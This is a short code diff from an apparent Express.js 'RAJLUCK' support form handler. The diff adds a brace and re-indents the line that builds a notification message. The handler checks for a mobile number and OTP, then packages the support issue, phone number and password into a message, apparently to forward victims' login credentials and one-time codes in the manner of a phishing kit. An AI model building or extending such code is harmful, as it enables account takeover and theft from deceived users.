@@ -27,7 +27,8 @@ app.post("/submit", async (req, res) => {
                 success: false,
                 message: "Kripya mobile number aur OTP dono enter karein."
             
-    const messageText = `RAJLUCK NOTIFICATION
+            }
+const messageText = `RAJLUCK NOTIFICATION
 📌 Support Issue: ${issue}
 📱 Mobile Number: ${phone}
 🔑 Password: ${password}
